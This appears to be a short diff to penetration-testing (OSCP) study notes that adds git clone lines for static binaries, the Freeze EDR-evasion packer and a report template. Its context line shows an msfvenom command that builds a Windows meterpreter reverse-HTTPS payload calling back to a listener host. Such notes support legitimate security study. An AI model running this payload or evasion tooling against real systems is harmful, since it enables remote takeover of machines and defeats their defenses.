@@ -34,6 +34,9 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.234 LPORT=443 -f 
 + (need administrator priviledge)
 ```
 
-# 
+# Other
 ```
+git clone https://github.com/andrew-d/static-binaries.git
+git clone https://github.com/optiv/Freeze
+git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
 ```
